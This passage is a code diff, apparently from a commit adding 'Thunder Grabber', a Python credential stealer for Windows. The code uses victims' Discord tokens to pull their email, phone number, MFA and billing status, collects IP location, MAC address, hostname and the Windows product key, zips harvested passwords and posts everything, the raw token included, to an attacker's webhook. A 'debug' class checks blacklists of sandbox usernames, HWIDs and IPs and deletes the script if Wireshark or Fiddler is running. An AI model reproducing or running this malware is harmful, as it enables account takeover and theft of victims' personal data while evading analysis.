+                        'Authorization': token,
+                        'Content-Type': 'application/json'
+                    }
+                
+
+                r = requests.get('https://discordapp.com/api/v9/users/@me', headers=headers)
+                if r.status_code == 200:
+                    r_json = r.json()
+                    user_name = f'{r_json["username"]}#{r_json["discriminator"]}'
+                    user_id = r_json['id']
+                    avatar_id = r_json['avatar']
+                    avatar_url = f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}"
+                    phone_number = r_json['phone']
+                    email = r_json['email']
+                    mfa_enabled = r_json['mfa_enabled']
+                try:
+                    nitro_data = requests.get(self.baseurl+'/billing/subscriptions', headers=self.getheaders(token)).json()
+                except Exception:
+                    pass
+                has_nitro = False
+                has_nitro = bool(len(nitro_data) > 0)
+                try:
+                    billing = bool(len(json.loads(requests.get(self.baseurl+"/billing/payment-sources", headers=self.getheaders(token)).text)) > 0)
+                except Exception:
+                    pass
+                    
+                data = requests.get("https://ipinfo.io/json").json()
+                ip = data['ip']
+                city = data['city']
+                country = data['country']
+                region = data['region']
+                wname = self.getProductKey()[0]
+                wkey = self.getProductKey()[1]
+                mac = gma()
+                hostname = socket.gethostname()
+                webhook = DiscordWebhook(url=weblink, username="Thunder", avatar_url="https://cdn.discordapp.com/attachments/961950134814535700/961950224874631228/Thighs2.jpg")
+                
+                embed = DiscordEmbed(title=f"💉 {user_name} Has Been Logged 💉",color=16777215)
+                embed.set_author(name="⚡ Thunder Grabber ⚡", url='https://github.com/TWIST-X7')
+                embed.add_embed_field(name='🧾 Account Inforamtion ', value=f"""```
+[Username] : {user_name}\n[User ID] : {user_id}\n[Phone Number] : {phone_number}\n[Email] : {email}\n[2FA/MFA Enabled] : {mfa_enabled}\n[Nitro Status] : {has_nitro}\n[Payment Method] : {billing} ```""", inline=False)
+                embed.add_embed_field(name='👨‍💻 User Information', value=f"""```
+[Hostname] : {hostname}\n[IP Adresse] : {ip}\n[Mac Adresse] : {mac} \n[City] : {city}\n[Country] : {country}\n[Region] : {region}\n[Platform] : {wname}\n[Product Key] : {wkey if wkey else 'No Product Key'}```""")
+
+                # set image
+                #https://media2.giphy.com/media/hvu0ZbzbmSKPzWlRab/giphy.gif?cid=790b761159f0a82ab80f44456a5da909b81700ecf5a2356a&rid=giphy.gif&ct=g
+
+                raw_url = "https://pastebin.com/raw/b7Hs9yqe"
+                gifs = requests.get(raw_url).text
+
+                lines = []
+                lines.append(gifs.strip('\n').split('\n'))
+                #random.choice(lines[0])
+                gif = random.choice(lines[0])
+                #url=random.choice(banners)
+                embed.set_image(url=gif)
+
+                # set thumbnail
+                embed.set_thumbnail(url=avatar_url)
+                embed.add_embed_field(name='🔑Token', value="||"+token+"||", inline=False)
+
+                # set footer
+                embed.set_footer(text='Thunder Grabber Made By TWISTX7#9122 \nhttps://github.com/TWIST-X7/Thunder-Grabber')
+                webhook.add_embed(embed)
+
+                
+
+                webhook.execute()
+        try:
+            tempfolder = os.getenv("temp")+"\\Thunder"
+            f2 = open(f"{tempfolder}\\passwords.txt", "w")
+            try:
+                f2.write(spyware().get_info())
+                f2.close()
+            except:
+                f2.write("Thunder Grabber Made By TWISTX7#9122 https://github.com/TWIST-X7/Thunder-Grabber\nNo Passwords Found")
+                f2.close()
+            appdata = os.getenv("localappdata")
+            _zipfile = os.path.join(appdata, f'{os.getenv("UserName")}-Info.zip')
+            zipped_file = zipfile.ZipFile(_zipfile, "w", zipfile.ZIP_DEFLATED)
+            abs_src = os.path.abspath(tempfolder)
+            for dirname, _, files in os.walk(tempfolder):
+                for filename in files:
+                    absname = os.path.abspath(os.path.join(dirname, filename))
+                    arcname = absname[len(abs_src) + 1:]
+                    zipped_file.write(absname, arcname)
+            zipped_file.close()
+            with open(_zipfile, 'rb') as f:
+                httpx.post(weblink, files={'upload_file': f})
+            shutil.rmtree(tempfolder)
+            os.remove(f'{appdata}\\{os.getenv("UserName")}-Info.zip')
+        except:
+            pass
+        
+class debug:
+    def __init__(self):
+        if self.checks(): self.self_destruct()
+    
+    def checks(self):
+        debugging = False 
+        
+        # blackList from Rdimo
+        self.blackListedUsers = ["WDAGUtilityAccount","Abby","Peter Wilson","hmarc","patex","JOHN-PC","RDhJ0CNFevzX","kEecfMwgj","Frank","8Nl0ColNQ5bq","Lisa","John","george","PxmdUOpVyx","8VizSM","w0fjuOVmCcP5A","lmVwjj9b","PqONjHVwexsS","3u2v9m8","Julia","HEUeRzl",]
+        self.blackListedPCNames = ["BEE7370C-8C0C-4","DESKTOP-NAKFFMT","WIN-5E07COS9ALR","B30F0242-1C6A-4","DESKTOP-VRSQLAG","Q9IATRKPRH","XC64ZB","DESKTOP-D019GDM","DESKTOP-WI8CLET","SERVER1","LISA-PC","JOHN-PC","DESKTOP-B0T93D6","DESKTOP-1PYKP29","DESKTOP-1Y2433R","WILEYPC","WORK","6C4E733F-C2D9-4","RALPHS-PC","DESKTOP-WG3MYJS","DESKTOP-7XC6GEZ","DESKTOP-5OV9S0O","QarZhrdBpj","ORELEEPC","ARCHIBALDPC","JULIA-PC","d1bnJkfVlH",]
+        self.blackListedHWIDS = ["7AB5C494-39F5-4941-9163-47F54D6D5016","032E02B4-0499-05C3-0806-3C0700080009","03DE0294-0480-05DE-1A06-350700080009","11111111-2222-3333-4444-555555555555","6F3CA5EC-BEC9-4A4D-8274-11168F640058","ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548","4C4C4544-0050-3710-8058-CAC04F59344A","00000000-0000-0000-0000-AC1F6BD04972","00000000-0000-0000-0000-000000000000","5BD24D56-789F-8468-7CDC-CAA7222CC121","49434D53-0200-9065-2500-65902500E439","49434D53-0200-9036-2500-36902500F022","777D84B3-88D1-451C-93E4-D235177420A7","49434D53-0200-9036-2500-369025000C65","B1112042-52E8-E25B-3655-6A4F54155DBF","00000000-0000-0000-0000-AC1F6BD048FE","EB16924B-FB6D-4FA1-8666-17B91F62FB37","A15A930C-8251-9645-AF63-E45AD728C20C","67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3","C7D23342-A5D4-68A1-59AC-CF40F735B363","63203342-0EB0-AA1A-4DF5-3FB37DBB0670","44B94D56-65AB-DC02-86A0-98143A7423BF","6608003F-ECE4-494E-B07E-1C4615D1D93C","D9142042-8F51-5EFF-D5F8-EE9AE3D1602A","49434D53-0200-9036-2500-369025003AF0","8B4E8278-525C-7343-B825-280AEBCD3BCB","4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27","79AF5279-16CF-4094-9758-F88A616D81B4",]
+        self.blackListedIPS = ["88.132.231.71","78.139.8.50","20.99.160.173","88.153.199.169","84.147.62.12","194.154.78.160","92.211.109.160","195.74.76.222","188.105.91.116","34.105.183.68","92.211.55.199","79.104.209.33","95.25.204.90","34.145.89.174","109.74.154.90","109.145.173.169","34.141.146.114","212.119.227.151","195.239.51.59","192.40.57.234","64.124.12.162","34.142.74.220","188.105.91.173","109.74.154.91","34.105.72.241","109.74.154.92","213.33.142.50",]
+        self.blacklistedProcesses = ["HTTP Toolkit.exe", "Fiddler.exe", "Wireshark.exe"]
+        
+        self.check_process()
+        
+        if self.get_ip(): debugging = True
+        if self.get_hwid(): debugging = True
+        if self.get_pcname(): debugging = True
+        if self.get_username(): debugging = True
+        
+        return debugging
+
+    def check_process(self):
+        for process in self.blacklistedProcesses:
+            if process in (p.name() for p in psutil.process_iter()):
+                self.self_destruct()
+        
+    def get_ip(self):
+        url = 'http://ipinfo.io/json'
+        response = urlopen(url)
+        data = load(response)
+        ip = data['ip']
+        
+        if ip in self.blackListedIPS:
+            return True
+        
+    def get_hwid(self):
+        p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
+        hwid = (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]       
+        
+        if hwid in self.blackListedHWIDS:
+            return True
+        
+    def get_pcname(self):
+        pc_name = os.getenv("COMPUTERNAME")
+        
+        if pc_name in self.blackListedPCNames:
+            return True
+        
+    def get_username(self):
+        pc_username = os.getenv("UserName")
+        
+        if pc_username in self.blackListedUsers:
+            return True
+        
+    def self_destruct(self):
+        os.system("del {}\{}".format(os.path.dirname(__file__), os.path.basename(__file__)))
+        exit()
+                           
+if __name__ == '__main__':
+    if os.name != "nt":
+        exit()
+    
+    debug()
+    grabber()
